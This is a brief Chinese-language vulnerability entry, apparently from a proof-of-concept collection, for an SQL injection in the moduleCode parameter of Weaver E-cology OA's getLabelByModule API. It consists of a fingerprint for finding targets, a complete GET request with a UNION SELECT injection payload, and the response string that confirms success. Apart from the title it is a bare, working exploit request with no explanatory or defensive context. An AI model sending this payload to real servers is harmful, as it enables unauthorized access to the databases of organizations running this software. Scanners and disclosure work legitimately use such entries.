# 泛微-API接口moduleCode参数存在SQL注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **指纹**：`"E-Weaver"`
- **请求**：`GET /api/ec/dev/locale/getLabelByModule?moduleCode=?moduleCode=?moduleCode=aaa')+union+all+select+'1,1123123'+-- HTTP/1.1`
- **响应特征**：200 1123123